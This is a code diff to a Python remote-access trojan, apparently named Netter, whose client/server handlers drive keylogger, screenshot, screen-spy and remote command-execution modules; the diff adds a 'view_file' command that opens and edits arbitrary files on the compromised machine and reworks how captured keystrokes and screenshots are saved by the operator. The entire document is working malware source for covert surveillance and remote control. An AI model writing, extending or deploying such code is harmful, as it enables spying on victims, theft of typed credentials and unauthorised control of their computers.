@@ -1,5 +1,5 @@
 import threading, socket, typing
-import time, pickle, os, json
+import time, pickle, os, json, copy
 from loguru import logger
 
 import zlib
@@ -10,6 +10,7 @@ if typing.TYPE_CHECKING:
     from .sock import NetterServer
 
 from .modules import screenshot as modules_screenshot
+from .modules import file_editor
 from .modules import keylogger
 from .modules import command_exec
 from .modules import screen_spy
@@ -17,6 +18,7 @@ from .modules import screen_spy
 class ClientWrapper:
     def __init__(self, connection: socket.socket, connectionAddress: tuple[str, int]) -> None:
         self.connection: socket.socket = connection
+
         self.connectionAddress: tuple[str, int] = connectionAddress
 
     def send_packet(self, data: str | bytes) -> int:
@@ -29,7 +31,7 @@ class ClientWrapper:
         byte_sended: int = 0
 
         while byte_sended < len(data):
-            sent = self.connection.send(data[byte_sended:byte_sended + 512])
+            sent = self.connection.send(data[byte_sended:byte_sended + (5120)])
 
             if (sent == 0):
                 raise RuntimeError('Socket connection broken')
@@ -44,7 +46,7 @@ class ClientWrapper:
         data, total_received = bytearray(), 0
 
         while total_received < packetSize:
-            chunk = self.connection.recv(min(512, packetSize - total_received))
+            chunk = self.connection.recv(min(5120, packetSize - total_received))
 
             if not chunk:
                 raise RuntimeError('Socket connection broken')
@@ -98,6 +100,15 @@ class ServerHandler:
             if (message.startswith(b'request_screenshot')):
                 modules_screenshot.run(self.socketInstance)
 
+            if (message.startswith(b'view_file ')):
+                if (os.path.exists(filePath := message.decode()[10:])):
+                    file = open(filePath, 'r+')
+                    self.socketInstance.send_packet('0')
+                    file_editor.run(self, filename = filePath, textIO = file)
+
+                else:
+                    self.socketInstance.send_packet('1')
+
             if (message.startswith(b'keylogger_activate')):
                 if not (self.isRunningKeylogger):
                     threading.Thread(target = keylogger.run, args = (self,)).start()
@@ -135,33 +146,6 @@ class ClientHandler(threading.Thread):
         self.connectionBucket.connectionList.remove(self.conneciton)
         self.isConnected = False
 
-    def write_file(self, file_path: str, content: str | bytes, mode: str | None = None) -> None:
-        directory = os.path.dirname(file_path)
-
-        if not os.path.exists(directory):
-            os.makedirs(directory)
-
-        with open(file = file_path, mode = (mode if mode else ('w' if isinstance(content, str) else 'wb'))) as file:
-            file.write(content)
-            file.close()
-
-    def set_cache(self) -> None:
-        result = {}
-
-        for key, value in self.conneciton.__dict__.items():
-            if key == 'socket':
-                break
-
-            result[key] = value
-
-        self.write_file(f'clients/cache/{self.conneciton.clientUniqueID}.json', '{}')
-        print(result)
-
-        json.dump(result,
-            open(f'clients/cache/{self.conneciton.clientUniqueID}.json', 'w'),
-            indent = 2
-        )
-
     def run(self) -> None:
         if (self.conneciton.runningKeylogger):
             self.conneciton.socket.send_packet('keylogger_activate')
@@ -182,9 +166,10 @@ class ClientHandler(threading.Thread):
                 clientAdditionalData: dict = pickle.loads(data[23:])
                 self.conneciton.additionalData = clientAdditionalData
 
-                self.conneciton.socket.receive_packet() # Used to verbose the _keylogger response
+                if (self.conneciton.runningKeylogger):
+                    self.conneciton.socket.receive_packet() # Used to verbose the _keylogger response
 
-            if (data.startswith(b'exec_response ')):
+            elif (data.startswith(b'exec_response ')):
 
                 if (data[14:15] == b'0'):
                     logger.success('Command execution successful with exit code: 0')
@@ -200,7 +185,7 @@ class ClientHandler(threading.Thread):
                 print(data[16:].decode())
                 self.NetterInstance._waitingForResponse = False
 
-            if (data.startswith(b'screenshot_response ')):
+            elif (data.startswith(b'screenshot_response ')):
                 if (b'not_available' in data):
                     logger.error('Client device are not capable of taking screenshots.')
                     self.NetterInstance._waitingForResponse = False
@@ -209,26 +194,16 @@ class ClientHandler(threading.Thread):
                 fileName: str = f'clients/responses/{self.conneciton.clientUniqueID}/screenshot/{self.conneciton.hostname}-{str(time.time())}.png'
                 screenImg: bytes = zlib.decompress(data[20:])
 
-                self.write_file(fileName, screenImg)
+                self.conneciton.write_file(fileName, screenImg)
                 logger.success(f'Screenshot has been save to {fileName}')
                 self.NetterInstance._waitingForResponse = False
 
-            if (data.startswith(b'keylogger_response ')):
-                self.write_file(
+            elif (data.startswith(b'keylogger_response ')):
+                self.conneciton.write_file(
                     f'clients/responses/{self.conneciton.clientUniqueID}/keylogger.log',
                     data[19:].decode('UTF-8') + '\n',
                     mode = 'a'
                 )
 
-            if (data.startswith(b'_keylogger_response ')):
-                if (data.decode('UTF-8')[-1] == '0'):
-                    logger.success('Keylogger has been activated, log will be saved on clients/responses/keylogger.log')
-                    self.conneciton.runningKeylogger = True
-
-                else:
-                    logger.success('Keylogger sucessfully turned off')
-                    self.conneciton.runningKeylogger = False
-
-                self.set_cache()
-                self.NetterInstance._waitingForResponse = False
-                continue
+            else:
+                self.conneciton.catchingResponse = data
